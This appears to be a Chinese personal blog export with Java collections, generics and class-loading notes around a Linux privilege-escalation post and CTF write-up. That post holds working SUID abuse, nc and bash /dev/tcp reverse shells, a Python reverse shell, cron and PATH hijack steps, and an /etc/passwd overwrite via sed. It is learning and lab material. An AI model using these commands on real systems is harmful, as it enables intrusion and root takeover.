import java.util.HashSet;import java.util.Iterator;import java.util.Set;public class New &#123;    @SuppressWarnings(&#123;&quot;all&quot;&#125;)    public static void main(String[] args) &#123;        Set set = new HashSet();        set.add(&quot;john&quot;);        set.add(&quot;lucy&quot;);        set.add(&quot;john&quot;);//重复        set.add(&quot;jack&quot;);        set.add(&quot;hsp&quot;);        set.add(&quot;mary&quot;);        set.add(null);//        set.add(null);//再次添加 null        for(int i = 0; i &lt;10;i ++) &#123;            System.out.println(&quot;set=&quot; + set);        &#125;//遍历//方式 1： 使用迭代器        System.out.println(&quot;=====使用迭代器====&quot;);        Iterator iterator = set.iterator();        while (iterator.hasNext()) &#123;            Object obj = iterator.next();            System.out.println(&quot;obj=&quot; + obj);        &#125;        set.remove(null);//方式 2: 增强 for        System.out.println(&quot;=====增强 for====&quot;);        for (Object o : set) &#123;            System.out.println(&quot;o=&quot; + o);        &#125;//set 接口对象，不能通过索引来获取    &#125;&#125;

Map接口和常用方法特点
Map 是用于存储键值对（key-value pairs）的集合，每个键唯一对应一个值，即可以通过指定的key找到对应的value

不能包含重复的键，但可以包含重复的值。

常见实现包括 HashMap、TreeMap 和 LinkedHashMap，它们分别有不同的排序和性能特性

当有相同的key时，就相当于等价替换：
map.put(&quot;no1&quot;, &quot;韩顺平&quot;);//k-vmap.put(&quot;no1&quot;, &quot;张三丰&quot;);//等价替换

常用方法添加和修改元素：

put(K key, V value)：将指定的键值对添加到 Map 中。如果键已存在，则更新其对应的值。

map.put(&quot;key1&quot;, &quot;value1&quot;);


putAll(Map&lt;? extends K, ? extends V&gt; m)：将指定 Map 中的所有键值对添加到当前 Map 中。

删除元素：

remove(Object key)：移除指定键的键值对，并返回其对应的值。

String removedValue = map.remove(&quot;key1&quot;);


clear()：清空 Map，移除所有键值对。
map.clear();

查询元素：

get(Object key)：返回指定键对应的值；如果 Map 中不存在该键，则返回 null。

String value = map.get(&quot;key1&quot;);


containsKey(Object key)：检查 Map 是否包含指定的键。

boolean hasKey = map.containsKey(&quot;key1&quot;);


containsValue(Object value)：检查 Map 是否包含指定的值。

boolean hasValue = map.containsValue(&quot;value1&quot;);

获取 Map 的信息：

size()：返回 Map 中的键值对数量。

int size = map.size();


isEmpty()：判断 Map 是否为空。

boolean isEmpty = map.isEmpty();

遍历方法
**keySet()**：返回映射中所有键的集合。
**values()**：返回映射中所有值的集合。
**entrySet()**：返回映射中所有键值对的集合（Map.Entry 对象的集合）。可以通过它来遍历 Map 的键值对

例子如下：
import java.util.HashMap;import java.util.Map;import java.util.Set;public class New &#123;    @SuppressWarnings(&#123;&quot;all&quot;&#125;)    public static void main(String[] args) &#123;        Map map = new HashMap();        map.put(&quot;Alice&quot;, 25);        map.put(&quot;Bob&quot;, 30);        map.put(&quot;Charlie&quot;, 35);        // 使用 keySet 遍历键        Set&lt;String&gt; keys = map.keySet();        for (String key : keys) &#123;            System.out.println(key + &quot; = &quot; + map.get(key));        &#125;        // 使用 entrySet 遍历键值对        for (Map.Entry&lt;String, Integer&gt; entry : map.entrySet()) &#123;            System.out.println(entry.getKey() + &quot; = &quot; + entry.getValue());        &#125;        // 使用 values 遍历值        Collection&lt;Integer&gt; values = map.values();        for (Integer value : values) &#123;            System.out.println(value);        &#125;    &#125;&#125;

开发中如何选择集合实现类
Collections工具类Collections是一个操作Set、List和Map等集合的工具类
Collections中提供了一系列静态的方法对集合元素进行排序、查询和修改等操作
以下是一些常用的 Collections 方法：

排序：Collections.sort(List&lt;T&gt; list) 可以对 List 进行升序排序。
List&lt;Integer&gt; numbers = Arrays.asList(5, 3, 9, 1);Collections.sort(numbers);System.out.println(numbers);  // 输出 [1, 3, 5, 9]

查找最大值和最小值：

Collections.max(Collection&lt;T&gt; coll) 查找集合中的最大值。
Collections.min(Collection&lt;T&gt; coll) 查找集合中的最小值。

int max = Collections.max(numbers);  // 返回 9int min = Collections.min(numbers);  // 返回 1

反转：Collections.reverse(List&lt;?&gt; list) 可以将 List 反转。
Collections.reverse(numbers);System.out.println(numbers);  // 输出 [9, 5, 3, 1]

随机打乱：Collections.shuffle(List&lt;?&gt; list) 可以将 List 随机打乱顺序。
Collections.shuffle(numbers);System.out.println(numbers);  // 输出打乱后的顺序

不可修改集合：Collections.unmodifiableList(List&lt;? extends T&gt; list) 可以返回一个不可修改的集合。
List&lt;Integer&gt; unmodifiableList = Collections.unmodifiableList(numbers);// 试图修改 unmodifiableList 会抛出 UnsupportedOperationException

泛型基础Java中的泛型（Generics）是Java 5引入的一项重要特性，允许类、接口和方法能够操作指定类型的对象，而无需在编写代码时明确指定类型。这种机制通过将类型参数化，提供了更高的代码复用性和类型安全性
传统方法面临的问题

不能对加入到集合中的数据类型进行约束（比如要求输入的是Dog类，结果不小心输入了Cat类）

遍历的时候，需要进行类型转换，影响效率
for (Object o : arrayList) &#123;//向下转型 Object -&gt;DogDog dog = (Dog) o;System.out.println(dog.getName() + &quot;-&quot; + dog.getAge());&#125;

对于泛型举个例子如下：

当我们 ArrayList&lt;Dog&gt; 表示存放到 ArrayList 集合中的元素是 Dog 类型 (细节后面说…) 

如果编译器发现添加的类型，不满足要求，就会报错 

在遍历的时候，可以直接取出 Dog 类型而不是 Object 
for (Dog dog : arrayList) &#123;	System.out.println(dog.getName() + &quot;-&quot; + dog.getAge());&#125;

public class ArrayList&lt;E&gt; &#123;&#125; E 称为泛型,那么 Dog-&gt;E


泛型的优点：

编译时检查了添加元素的类型，提高了安全性
减少了类型转换的次数，提高了效率
不会提示编译警告

利用1. 泛型类定义一个泛型类 Box，用来存储任意类型的对象：
public class Box&lt;T&gt; &#123;    private T item;    public void setItem(T item) &#123;        this.item = item;    &#125;    public T getItem() &#123;        return item;    &#125;&#125;

使用泛型类的例子：
public class Main &#123;    public static void main(String[] args) &#123;        Box&lt;String&gt; stringBox = new Box&lt;&gt;();        stringBox.setItem(&quot;Hello&quot;);        System.out.println(&quot;String: &quot; + stringBox.getItem());        Box&lt;Integer&gt; integerBox = new Box&lt;&gt;();        integerBox.setItem(123);        System.out.println(&quot;Integer: &quot; + integerBox.getItem());    &#125;&#125;

输出：
String: HelloInteger: 123

2. 泛型方法定义一个泛型方法 printArray，可以打印任何类型数组的内容：
public class Main &#123;    public static &lt;T&gt; void printArray(T[] inputArray) &#123;        for (T element : inputArray) &#123;            System.out.println(element);        &#125;    &#125;    public static void main(String[] args) &#123;        Integer[] intArray = &#123;1, 2, 3&#125;;        String[] strArray = &#123;&quot;Hello&quot;, &quot;World&quot;&#125;;        printArray(intArray);  // 打印整型数组        printArray(strArray);  // 打印字符串数组    &#125;&#125;

输出：
123HelloWorld

3. 泛型接口定义一个泛型接口 Container，用来存储和获取任意类型的对象：
public interface Container&lt;T&gt; &#123;    void add(T item);    T get();&#125;public class StringContainer implements Container&lt;String&gt; &#123;    private String item;    @Override    public void add(String item) &#123;        this.item = item;    &#125;    @Override    public String get() &#123;        return item;    &#125;&#125;

使用泛型接口的例子：
public class Main &#123;    public static void main(String[] args) &#123;        StringContainer container = new StringContainer();        container.add(&quot;Hello Generics&quot;);        System.out.println(container.get());    &#125;&#125;

输出：
Hello Generics

4. 泛型通配符使用通配符 &lt;? extends T&gt; 和 &lt;? super T&gt; 来限定类型的范围：
上限通配符 &lt;? extends T&gt;表示类型必须是T或其子类。定义一个方法打印所有类型为Number及其子类的列表。
import java.util.List;public class Main &#123;    public static void printNumbers(List&lt;? extends Number&gt; numbers) &#123;        for (Number number : numbers) &#123;            System.out.println(number);        &#125;    &#125;    public static void main(String[] args) &#123;        List&lt;Integer&gt; intList = List.of(1, 2, 3);        List&lt;Double&gt; doubleList = List.of(1.1, 2.2, 3.3);        printNumbers(intList);   // 打印整型列表        printNumbers(doubleList); // 打印双精度列表    &#125;&#125;

输出：
1231.12.23.3

下限通配符 &lt;? super T&gt;表示类型必须是T或其父类。定义一个方法将元素添加到列表中，列表可以是Integer或其父类的类型。
import java.util.List;import java.util.ArrayList;public class Main &#123;    public static void addNumbers(List&lt;? super Integer&gt; list) &#123;        list.add(1);        list.add(2);        list.add(3);    &#125;    public static void main(String[] args) &#123;        List&lt;Number&gt; numberList = new ArrayList&lt;&gt;();        addNumbers(numberList);                for (Object num : numberList) &#123;            System.out.println(num);        &#125;    &#125;&#125;

输出：
123

总结
泛型类：可以让类存储和操作多种不同类型的数据。
泛型方法：允许方法适应多种类型。
泛型接口：使接口可以与不同类型的实现类进行交互。
通配符：提供了更灵活的类型限定。

常见泛型符号：
T：Type，表示类型。
E：Element，常用于集合类中。
K：Key，常用于键值对。
V：Value，常用于键值对。

注意事项：
T、E只能是引用类型
在给泛型指定具体类型后，可以传入该类型或者其子类类型
当写List list3 = new ArrayList();，默认它的泛型为E，也就是Object

自定义泛型自定义泛型类基本语法
class 类名 &lt;T,R...&gt;//...表示可以有多个泛型&#123;	成员&#125;

注意事项：

普通成员可以使用泛型
使用泛型的数组，不能初始化
静态方法中不能使用类的泛型
泛型类的类型，是在创建对象的时候确定的（因为创建对象时，需要指定类型）
如果在创建对象的时候没有指定类型，默认为Object

下面举个相关的例子：
import java.util.Arrays;@SuppressWarnings(&#123;&quot;all&quot;&#125;)public class New &#123;    public static void main(String[] args) &#123;        //T=Double, R=String, M=Integer        Tiger&lt;Double,String,Integer&gt; g = new Tiger&lt;&gt;(&quot;john&quot;);        g.setT(10.9); //OK//g.setT(&quot;yy&quot;); //错误，类型不对        System.out.println(g);        Tiger g2 = new Tiger(&quot;john~~&quot;);//OK T=Object R=Object M=Object        g2.setT(&quot;yy&quot;); //OK ,因为 T=Object &quot;yy&quot;=String 是 Object 子类        System.out.println(&quot;g2=&quot; + g2);    &#125;&#125;//1. Tiger 后面泛型，所以我们把 Tiger 就称为自定义泛型类//2, T, R, M 泛型的标识符, 一般是单个大写字母//3. 泛型标识符可以有多个. //4. 普通成员可以使用泛型 (属性、方法)//5. 使用泛型的数组，不能初始化//6. 静态方法中不能使用类的泛型class Tiger&lt;T, R, M&gt; &#123;    String name;    R r; //属性使用到泛型    M m;    T t;    //因为数组在 new 不能确定 T 的类型，就无法在内存开空间    T[] ts;    public Tiger(String name) &#123;        this.name = name;    &#125;    public Tiger(R r, M m, T t) &#123;//构造器使用泛型        this.r = r;        this.m = m;        this.t = t;    &#125;    public Tiger(String name, R r, M m, T t) &#123;//构造器使用泛型        this.name = name;        this.r = r;        this.m = m;        this.t = t;    &#125;//因为静态是和类相关的，在类加载时，对象还没有创建//所以，如果静态方法和静态属性使用了泛型，JVM 就无法完成初始化// static R r2;// public static void m1(M m) &#123;//// &#125;//方法使用泛型public String getName() &#123;    return name;&#125;    public void setName(String name) &#123;        this.name = name;    &#125;    public R getR() &#123;        return r;    &#125;    public void setR(R r) &#123;//方法使用到泛型        this.r = r;    &#125;    public M getM() &#123;//返回类型可以使用泛型. return m;        return m;    &#125;    public void setM(M m) &#123;        this.m = m;    &#125;    public T getT() &#123;        return t;    &#125;    public void setT(T t) &#123;        this.t = t;    &#125;    @Override    public String toString() &#123;        return &quot;Tiger&#123;&quot; +                &quot;name=&#x27;&quot; + name + &#x27;\&#x27;&#x27; +                &quot;, r=&quot; + r +                &quot;, m=&quot; + m +                &quot;, t=&quot; + t +                &quot;, ts=&quot; + Arrays.toString(ts) +                &#x27;&#125;&#x27;;    &#125;&#125;

自定义泛型接口基本语法：
interface 接口名&lt;T,R&gt;&#123;&#125;

注意事项：

接口中，静态成员不能使用泛型
泛型接口的类型，在继承接口或者实现接口的时候确定
没有指定类型，默认为Object

举例如下：
//在继承接口 指定泛型接口的类型interface IA extends IUsb&lt;String, Double&gt; &#123;&#125;//当我们去实现 IA 接口时，因为 IA 在继承 IUsu 接口时，指定了 U 为 String R 为 Double//，在实现 IUsu 接口的方法时，使用 String 替换 U, 是 Double 替换 Rclass AA implements IA &#123;    @Override    public Double get(String s) &#123;        return null;    &#125;    @Override    public void hi(Double aDouble) &#123;    &#125;    @Override    public void run(Double r1, Double r2, String u1, String u2) &#123;    &#125;&#125;//实现接口时，直接指定泛型接口的类型//给 U 指定 Integer 给 R 指定了 Float//所以，当我们实现 IUsb 方法时，会使用 Integer 替换 U, 使用 Float 替换 Rclass BB implements IUsb&lt;Integer, Float&gt; &#123;    @Override    public Float get(Integer integer) &#123;        return null;    &#125;    @Override    public void hi(Float aFloat) &#123;    &#125;    @Override    public void run(Float r1, Float r2, Integer u1, Integer u2) &#123;    &#125;&#125;//没有指定类型，默认为 Object//建议直接写成 IUsb&lt;Object,Object&gt;class CC implements IUsb &#123; //等价 class CC implements IUsb&lt;Object,Object&gt; &#123;    @Override    public Object get(Object o) &#123;        return null;    &#125;    @Override    public void hi(Object o) &#123;    &#125;    @Override    public void run(Object r1, Object r2, Object u1, Object u2) &#123;    &#125;&#125;interface IUsb&lt;U, R&gt; &#123;    int n = 10;//U name; 不能这样使用//普通方法中，可以使用接口泛型	R get(U u);    void hi(R r);    void run(R r1, R r2, U u1, U u2);    //在 jdk8 中，可以在接口中，使用默认方法, 也是可以使用泛型    default R method(U u) &#123;        return null;    &#125;&#125;

自定义泛型方法基本语法：
修饰符 &lt;T,R&gt;返回类型 方法名(参数列表)&#123;&#125;

注意事项：

泛型方法可以定义在普通类中，也可以定义在泛型类中
当泛型方法被调用时，类型就会确定
public void eat(E e){}，修饰符后没有&lt;T,R…&gt;eat方法不是泛型方法，而是使用了泛型

举个例子如下
import java.util.ArrayList;@SuppressWarnings(&#123;&quot;all&quot;&#125;)public class New &#123;    public static void main(String[] args) &#123;        Car car = new Car();        car.fly(&quot;宝马&quot;, 100);//当调用方法时，传入参数，编译器，就会确定类型        System.out.println(&quot;=======&quot;);        car.fly(300, 100.1);//当调用方法时，传入参数，编译器，就会确定类型//测试//T-&gt;String, R-&gt; ArrayList        Fish&lt;String, ArrayList&gt; fish = new Fish&lt;&gt;();        fish.hello(new ArrayList(), 11.3f);    &#125;&#125;//泛型方法，可以定义在普通类中, 也可以定义在泛型类中class Car &#123;//普通类    public void run() &#123;//普通方法    &#125;    //说明 泛型方法//1. &lt;T,R&gt; 就是泛型//2. 是提供给 fly 使用的    public &lt;T, R&gt; void fly(T t, R r) &#123;//泛型方法        System.out.println(t.getClass());//String        System.out.println(r.getClass());//Integer    &#125;&#125;class Fish&lt;T, R&gt; &#123;//泛型类    public void run() &#123;//普通方法    &#125;    public &lt;U, M&gt; void eat(U u, M m) &#123;//泛型方法    &#125;    //说明//1. 下面 hi 方法不是泛型方法//2. 是 hi 方法使用了类声明的 泛型    public void hi(T t) &#123;    &#125;    //泛型方法，可以使用类声明的泛型，也可以使用自己声明泛型    public &lt;K&gt; void hello(R r, K k) &#123;        System.out.println(r.getClass());//ArrayList        System.out.println(k.getClass());//Float    &#125;&#125;



]]></content>
      <categories>
        <category>开发</category>
      </categories>
  </entry>
  <entry>
    <title>linux webshell提权</title>
    <url>/2025/08/15/linux-webshell%E6%8F%90%E6%9D%83/</url>
    <content><![CDATA[参考Linux suid提权
Linux suid提权什么是suidsuid(set uid)是linux中的一种特殊权限，suid可以让调用者以文件拥有者身份运行该文件，所以利用suid提权的核心就是运行root用户所拥有的suid的文件，那么运行该文件的时候就得获得root用户的身份了。
suid特点是用户运行某个程序时，如果该程序有suid权限，程序运行进程的属主不是发起者，而是程序文件所属的属主。
linux引入了3个文件来管理用户组：

&#x2F;etc&#x2F;passwd存放用户信息。
&#x2F;etc&#x2F;shadow存放用户密码信息。
&#x2F;etc&#x2F;group存放组信息。

在文件系统中的每个文件的文件头里面添加了用户和文件之间的关系信息。
用户信息&#x2F;etc&#x2F;passwd每行共有7个字段冒号隔开：
字段1为用户名。
字段2为用户的密码。
字段3为指UID，每个用户都有自己的uid。
字段4为组UID，每个用户都有不同的uid。
字段5为解释说明的字段。
字段6为指用户的根目录。
字段7为指登录shell，用户登录shell，当前为&#x2F;bin&#x2F;zsh表示可以登录，&#x2F;sbin&#x2F;nologin标识不被授权登录。

如何利用在执行过程中，调用者会暂时获得该文件的所有者权限，且该权限只在程序执行的过程中有效。
只有root用户的uid是0，如果把一个普通用户的uid修改为0，那么只要以普通用户的用户名和密码登录系统就会自动切换到root用户，在系统加固时一定要找出有哪些用户的uid为0。
假设可执行文件binexec其属主为root，当以非root身份登录时，如binexec设置了suid权限，就可以在非root身份下运行该可执行文件，可执行文件运行时该进程的权限为root权限。
利用此特性，就可通过suid进行提权。
如何设置suid利用
chmod u+s filename #设置suidchmod u-s filename #去除suid


可以看见，我们示例的图片由 -rw变为了-rwS,所以就是添加上了suid权限
如何查找suid文件具有suid权限的二进制可执行文件有：
nmapvimfindbashmorelessnanocpawk

从网上找了几个常见的命令
更多有关suid的可以看GTFOBins
find / -user root -perm -4000 -print 2&gt;/dev/nullfind / -perm -u=s -type f 2&gt;/dev/nullfind / -user root -perm -4000 -exec ls -ldb &#123;&#125; \;

以find &#x2F; -perm -u&#x3D;s -type f 2&gt;&#x2F;dev&#x2F;null讲解一下各个参数代表什么
find / -perm -u=s -type f 2&gt;/dev/null/表示从文件系统的顶部（根）开始并找到每个目录-perm 表示搜索随后的权限-u = s表示查找root用户拥有的文件-type表示我们正在寻找的文件类型f 表示常规文件，而不是目录或特殊文件2表示该进程的第二个文件描述符，即stderr（标准错误）&gt;表示重定向/dev/null是一个特殊的文件系统对象，它将丢弃写入其中的所有内容。


利用以上这几个命令可以找到正在系统上运行的所有suid可执行文件。
也可以使用sudo -l 列出当前用户可执行的命令
举个例子，我这里用Newstar的靶机演示了
find / -user root -perm -4000 -exec ls -ldb &#123;&#125; \;


ls一下看看是否设置了suid权限
ls -al /usr/bin/su


可以看到确实设置了suid权限，而且属主为root，现在我们是不是可以利用我们之前提到的suid可执行二进制文件从而进行提权呢
进行suid提权（这里就记一个find）这里的前提都是要有suid权限
findfind 具有suid权限的filename -exec whoami \; -quit#rootfind 具有suid权限的filename -exec /bin/sh -p \; -quit#whoami#root


还有一种差不多的提权方法
#先前利用以上查找suid文件查询到了/usr/bin/find 有suid权限touch 1.txt #创建1.txt/usr/bin/find 1.txt -exec whoami \;


广播shell
在靶机上：
find user -exec nc -lvp 4444 -e &#x27;/bin/sh&#x27; \;

在攻击机上：
nc 靶机ip 4444

反弹shell
在靶机上:
find 具有suid权限的filename -exec bash -c &#x27;bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1&#x27; \;

在攻击机上：
nc -lvp port


这里我延申一下，也可以写一个反弹root的shell
python -c &#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;ip&quot;,port));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#x27;nc -lvp port


这里也可以结合之前的命令
/usr/bin/find 1.txt -exec python -c  &#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;ip&quot;,port));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#x27; \;

一些奇奇怪怪的提权通过查询历史记录从而获得信息泄露的信息利用以下命令可以获取
cat ~/.bash_history

这个命令可以查看当前用户使用过的历史命令
有可能会得到root登录的密码

linux配置错误从而提权利用linuxprivchecker：https://www.securitysift.com/download/linuxprivchecker.py
unix-privesc-check：http://pentestmonkey.net/tools/audit/unix-privesc-check
这两个工具进行查找linux中配置错误的文件
计划任务提权文件覆盖计划任务由 crontab 管理，非 root 用户是无法列出 root 用户的计划任务的，但可以列出 &#x2F;etc 的系统任务，系统任务默认是 root 权限运行的
如果某些定时任务是以 root 身份运行的，但它调用的 脚本&#x2F;可执行文件 或 日志文件 权限设置不当，被普通用户可修改，那么普通用户就可以在其中插入恶意命令，从而获得 root 权限

常见检查点：

查看定时任务的配置文件：
cat /etc/crontabls -l /etc/cron*

这些里面的任务很多都是 root 执行的。

列出系统中所有用户的 crontab：
ls -l /var/spool/cron/

普通用户一般只能改自己的，但 root 的脚本要重点关注。

检查 cron 调用的脚本&#x2F;命令是否可写：
grep -R &quot;&quot; /etc/cron* 2&gt;/dev/null

然后逐个 ls -l 查看脚本是否对普通用户可写。

快速查找所有 root 任务涉及的可写文件：
for file in $(grep -oP &#x27;(?&lt;=\s)/[^\s]+&#x27; /etc/crontab /etc/cron.*/* 2&gt;/dev/null); do    if [ -w &quot;$file&quot; ]; then        echo &quot;[+] Writable: $file&quot;    fidone

这段脚本会找出计划任务调用的文件，并检查是否对当前用户可写


举一个简单的例子
假设 /etc/crontab 中有这样一行：
* * * * * root /usr/local/bin/backup.sh

再看文件权限：
ls -l /usr/local/bin/backup.sh-rwxrwxrwx 1 root root 1234 Sep 10 20:00 /usr/local/bin/backup.sh

发现 backup.sh 是 所有用户可写 (777)，那么普通用户就可以这样：
echo &quot;bash -i &gt;&amp; /dev/tcp/127.0.0.1/4444 0&gt;&amp;1&quot; &gt;&gt; /usr/local/bin/backup.sh

然后在攻击机监听：
nc -lvnp 4444

下一次 cron 执行时（每分钟），你就会得到一个 root shell
环境变量劫持原理

cron 任务默认是以 root 身份运行的。

如果在 cron 中没有写绝对路径，而是写了一个命令名，比如：
* * * * * root backup

系统会去 $PATH 环境变量指定的路径里依次找 backup 这个可执行文件。

如果攻击者能控制 PATH（或者 cron 任务执行时 PATH 包含了一个 可写目录，如 /tmp），就能在那个目录下放一个同名的恶意程序。

cron 运行时就会执行我们伪造的程序，从而拿到 root 权限。



检查方法

查看 &#x2F;etc&#x2F;crontab 和 &#x2F;etc&#x2F;cron.* 文件，看看任务有没有用相对命令（例如 backup、tar、python）而不是绝对路径（如 /usr/bin/tar）。
cat /etc/crontabcat /etc/cron.d/*

检查 cron 环境变量设置 在 /etc/crontab 中，前几行可能有：
SHELL=/bin/shPATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

如果 PATH 中有一个可写目录（比如 /tmp），那么就有机会劫持。

检测可写目录
for dir in $(echo $PATH | tr &quot;:&quot; &quot; &quot;); do    [ -w &quot;$dir&quot; ] &amp;&amp; echo &quot;[+] Writable: $dir&quot;done


举个例子
假设 /etc/crontab 中有：
* * * * * root backup

同时 PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin:/tmp
这里 /tmp 是所有用户可写的。
攻击步骤：

在 /tmp 下创建一个恶意程序 backup：
echo &#x27;#!/bin/bash&#x27; &gt; /tmp/backupecho &#x27;bash -i &gt;&amp; /dev/tcp/127.0.0.1/4444 0&gt;&amp;1&#x27; &gt;&gt; /tmp/backupchmod +x /tmp/backup

攻击机监听端口：
nc -lvnp 4444

等待 cron 下次运行（每分钟执行一次）。


结果： root 会执行 /tmp/backup（因为 PATH 优先级），攻击者就能拿到 root shell

 PATH 优先级的原理
当 Linux 执行一个命令时，如果没有写绝对路径（比如直接写 backup 而不是 /usr/bin/backup），系统会按照 $PATH 环境变量里的目录顺序依次查找。
举个例子：
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin:/tmp

如果运行 backup，查找顺序是：

/usr/local/sbin/backup
/usr/local/bin/backup
/sbin/backup
/bin/backup
/usr/sbin/backup
/usr/bin/backup
/tmp/backup

只要找到第一个匹配的可执行文件，就会立即执行，不会继续找

如何确保执行我们的文件
方法一：利用 PATH 顺序 如果 PATH 中本来就有一个可写目录（例如 /tmp），并且它在真正命令所在目录的 前面，那么只要我们在里面放一个同名的恶意文件，就一定会被优先执行。

方法二：修改 PATH 有时候 /etc/crontab 或脚本里会直接定义 PATH，比如：
PATH=/tmp:/usr/bin:/bin

那么 /tmp 会优先。 如果我们能修改调用的脚本（或者配置文件），也能插入一个恶意 PATH。

方法三：命令本身就是自定义的 如果 cron 任务里写的是 backup，而系统里本来就没有 backup 这个程序，那我们直接在 PATH 可写目录下放一个 backup，cron 就会默认用我们的


[湖湘杯 2021 final]Penetratable[湖湘杯 2021 final]Penetratable
这道题差不多可以当成渗透题目来做
拿到题目网址，先用dirsearch扫一手
Target: http://node4.anna.nssctf.cn:28861/[17:31:17] Starting:[17:31:20] 403 -  288B  - /.ht_wsr.txt[17:31:20] 403 -  288B  - /.htaccess.bak1[17:31:20] 403 -  288B  - /.htaccess.orig[17:31:20] 403 -  288B  - /.htaccess.sample[17:31:20] 403 -  288B  - /.htaccess.save[17:31:20] 403 -  288B  - /.htaccess_extra[17:31:20] 403 -  288B  - /.htaccess_orig[17:31:20] 403 -  288B  - /.htaccess_sc[17:31:20] 403 -  288B  - /.htaccessBAK[17:31:20] 403 -  288B  - /.htaccessOLD[17:31:20] 403 -  288B  - /.htm[17:31:20] 403 -  288B  - /.html[17:31:20] 403 -  288B  - /.htaccessOLD2[17:31:20] 403 -  288B  - /.htpasswd_test[17:31:20] 403 -  288B  - /.httr-oauth[17:31:20] 403 -  288B  - /.htpasswds[17:31:21] 403 -  288B  - /.php[17:31:29] 301 -  335B  - /app  -&gt;  http://node4.anna.nssctf.cn:28861/app/[17:31:29] 200 -  520B  - /app/[17:31:32] 301 -  338B  - /config  -&gt;  http://node4.anna.nssctf.cn:28861/config/[17:31:32] 200 -  487B  - /config/[17:31:42] 200 -    0B  - /phpinfo.php[17:31:46] 403 -  288B  - /server-status/[17:31:46] 403 -  288B  - /server-status[17:31:47] 301 -  338B  - /static  -&gt;  http://node4.anna.nssctf.cn:28861/static/Task Completed

直接访问&#x2F;phpinfo.php无任何反应，空白页面
先注册一个账号，登录之后发现有修改密码功能，并且通过熊猫头插件扫出来的接口得知存在admin和root用户，直接访问会提示无权限


用bp拦截下该重置密码的请求并将用户名改为admin，密码修改成功

再将名字改为root尝试修改提示无权限
再登录admin账号，直接访问接口&#x2F;?c&#x3D;admin&amp;m&#x3D;updatePass，提示缺少参数
于是查看js文件，搜索updatePass()方法
function updatePass()&#123;    // let name=encodeURIComponent(Base64.encode($(&quot;.input-group&gt;input&quot;).eq(0).val()))    // let oldPass=$(&quot;.input-group&gt;input&quot;).eq(1).val()?hex_md5($(&quot;.input-group&gt;input&quot;).eq(1).val()):&#x27;&#x27;;    // let newPass=$(&quot;.input-group&gt;input&quot;).eq(2).val()?hex_md5($(&quot;.input-group&gt;input&quot;).eq(2).val()):&#x27;&#x27;;    // let saying=encodeURIComponent(Base64.encode($(&quot;.input-group&gt;input&quot;).eq(3).val()))    // $.ajax(&#123;    //     url: &#x27;/?c=admin&amp;m=updatePass&#x27;,    //     type: &#x27;post&#x27;,    //     data: &#x27;name=&#x27;+name+&#x27;&amp;newPass=&#x27;+newPass+&#x27;&amp;oldPass=&#x27;+oldPass+&#x27;&amp;saying=&#x27;+saying,    //     // async:true,    //     dataType: &#x27;text&#x27;,    //     success: function(data)&#123;    //         alertHandle(data);    //     &#125;    // &#125;);&#125;

补上相关参数后，尝试修改root密码，成功

成功登录root账号，里面有一个查看日志的功能，并可以将该日志文件下载下来
拦截下载请求包，发送到repeater，发现返回包会直接返回文件内容

于是尝试是否有目录遍历漏洞，就访问前面dirsearch扫出来的文件phpinfo.php，成功

将md5序列拿去解密

都明白了之后，直接反弹shell出来

查看根目录发现访问flag文件需要root权限，并且只能读取不能进行其他操作

进行suid提权，首先查看哪些文件有suid权限：find / -perm -u=s -type f 2&gt;/dev/null

其中有&#x2F;bin&#x2F;sed我们可以进行利用，问手ai看看如何利用，成功读取flag

还有另外一种方法，如下所示：
www-data@6aae652213e24b63:/var/www/html$ perl -le &#x27;print crypt(&quot;test&quot;,&quot;addedsalt&quot;)&#x27;adMpHktIn0tR2www-data@6aae652213e24b63:/var/www/html$ sed -i &#x27;s/root:x/root:adMpHktIn0tR2/g&#x27; /etc/passwdwww-data@6aae652213e24b63:/var/www/html$ suPassword: root@6aae652213e24b63:/var/www/html# cat /flagNSSCTF&#123;689a8f95-ec99-490e-8dbf-65f9df21d716&#125;

SUDO提权sudo -l

https://gtfobins.github.io/
]]></content>
      <categories>
        <category>渗透</category>
      </categories>
  </entry>
  <entry>
    <title>java类加载</title>
    <url>/2024/10/24/java%E7%B1%BB%E5%8A%A0%E8%BD%BD/</url>
    <content><![CDATA[静态代码块的执行在上文JDK动态代理的代码中，在Person类定义中添加以下几点：
一个静态属性id，一个静态方法，一个静态代码块，一个构造代码块
public static int id;public static void staticAction()&#123;    System.out.println(&quot;静态方法调用&quot;);&#125;static &#123;    System.out.println(&quot;静态代码块调用&quot;);&#125;&#123;    System.out.println(&quot;构造代码块利用&quot;);&#125;

对静态属性调用，会触发静态代码块
Person.id = 1;

对静态方法调用，也会触发静态代码块
Person.staticAction();

对类进行初始化，两种代码块都被调用：
new Person();

class的获取在java中，获取一个类的class，有下面几种方式：
这样只进行了加载，没进行初始化，因此没有任何输出
Class&lt;?&gt; c = Person.class;

直接通过loadClass方法也没进行初始化，无输出
ClassLoader classLoader = ClassLoader.getSystemClassLoader();Class&lt;?&gt; c = classLoader.loadClass(&quot;com.potato.Entity.Person&quot;);

这样就能调用了静态代码块，也就是进行了初始化的操作
Class&lt;?&gt; c = Class.forName(&quot;Person&quot;);

跟进forName，能够看到下面调用了个forName0（它被调用来执行真正的类加载操作），其中第二个参数为true，意味是否初始化，默认forName传入一个参数就为true

我们跟进forName0

第一个参数是类名，第二个参数是是否初始化，第三个参数是类加载器，第四个参数不是很重要
在Class.java中继续查看可以发现还有一个重载的forName（完整版）

通过该函数我们可以控制类是否进行初始化，跟进第三个参数可以发现类ClassLoader是一个抽象类，不能够直接进行实例化

但是其有一个静态方法getSystemClassLoader()能获取到一个ClassLoader对象

于是我们来测试，自己输入相关参数，不让类进行初始化，也就不会调用静态方法

但是只要将其实例化之后，就都会正常调用
